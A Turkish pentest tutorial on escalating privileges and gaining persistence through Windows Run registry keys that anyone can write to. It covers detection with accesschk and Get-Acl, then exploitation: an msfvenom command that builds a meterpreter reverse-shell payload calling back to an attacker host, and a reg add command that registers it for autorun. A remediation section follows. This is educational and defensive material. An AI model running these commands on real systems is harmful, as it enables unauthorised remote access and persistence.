---
layout: post
title: Modifiable Registry AutoRun Keys
description: "Kayıt Defterindeki Düzenlenebilir Başlangıç Anahtarı."
modified: 2020-09-07
comments: true
categories: TR
tags: [yetki yükseltme, privilege escalation, windows, pentest]
---


## Özet

Windows sistemlerde yanlış yapılandırılmış kayıt defteri kayıtları bulunabilir. Standart kurulumlarda sıklıkla karşılaşılan bir durum olmasa da kullanıcılar bazen izinleri yanlış yapılandırarak, kötü niyetli kişilere yeni ayrıcalıklar elde etmek için bir yol açmış olabilirler. Bazen bu izinler kullanılarak yeni ayrıcalıklar elde edilebilir. 

## Detay

Özetle bazı anahtarlar yönetici olmayan kullanıcılar tarafından değiştirilebilir olduğunda bu anahtarlar manipüle edilerek sistemde yetki yükseltilebilir ve sistemde kalıcılık sağlanabilir. 

Örnek olarak AutoRun özelliğini aktifleştiren anahtarlar verilebilir. Aşağıda sistemin her açılışında otomatik olarak başlatacağı uygulamaların belirlendiği kayıt bölümü olan Run kaydının herkes tarafından düzenlenebildiği gösterilmiştir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/1.png" alt="">
</p>

## Bulunması

Yanlış yapılandırılmış kayıt defteri izinlerini otomatik olarak bulmak için DazzleUp kullanılabilir. DazzleUp’ın yanlış yapılandırma için oluşturduğu çıktının ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/2.png" alt="">
</p>

Yanlış yapılandırılmış kayıt defteri iznini bulmak için sysinternal araçlarından olan accesschk.exe kullanılabilir. HKLM altında yanlış yapılandırılmış bir kayıt bulmak için;

```powershell
Accesschk64.exe “Everyone” -kvuqsw HKLM\
```
komutunu kullanarak Everyone’ın değişiklik yapma iznine sahip olduğu tüm kayıtları listeleyebiliriz. Aşağıda yanlış yapılandırılmış kayıt gösterilmiştir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/3.png" alt="">
</p>

Yanlış yapılandırılmış kaydı detaylı incelemek için;

```powershell
Get-Acl -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Format-List
```
komutu kullanılabilir.
Ekran görüntüsünden görüldüğü üzere ilgili kayıt NT AUTHORITY\SYSTEM grubuna dahil olup **Everyone** tarafından tam erişime sahip.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/4.png" alt="">
</p>

## İstismar Edilmesi
Zararlı yazılım üretilerek sisteme yüklenecektir. Zararlının üretildiğine dair ekran görüntüsü aşağıda verilmiştir. 

```bash
msfvenom --platform windows -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.6.182 LPORT=445 -f exe -o cmd.exe
```

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/5.png" alt="">
</p>

İlgili dosyanın hedef makineye daha önceden elde edilmiş bir oturum üzerinden yüklenmesine dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/6.png" alt="">
</p>

Bu kayıt bölümünde herkes değişiklik yapabildiği için;

```powershell
Reg add “HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” /t REG_EXPAND_SZ /v Insecure /d “C:\Users\test\Desktop\cmd.exe”
```
komutunu girerek zararlı yazılımı her oturum açılışında çalıştırılacak şekilde ayarlamış bulunuyoruz. Anahtara zararlı yazılımın tam yolunun verildiğine dair ekran görüntüsü aşağıda verilmiştir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/7.png" alt="">
</p>

Sonraki oturum açılışında, oturum açan kullanıcı ayrıcalıklarında uzaktan erişim elde edilecektir. Administrator kullanıcısı oturum açtığında elde edilen uzaktan erişim oturumu aşağıda ki ekran görüntüsünde gösterilmiştir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/8.png" alt="">
</p>

## Çözüm

Hatalı yapılandırmayı gidermek için, yanlış yapılandırılmış kaydın izinler bölümünde düzenleme yapılmalıdır. İzinlerin nereden değiştirileceği aşağıda ki ekran görüntülerinde gösterilmiştir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/9.png" alt="">
</p>


<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/10.png" alt="">
</p>

Yanlış yapılandırmanın düzeldiğine dair ekran görüntüsü aşağıda verilmitir.

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/11.png" alt="">
</p>

## Kaynakça

*	https://en.wikipedia.org/wiki/Windows_Registry
*	https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys
*	https://github.com/hlldz/dazzleUP
*	https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
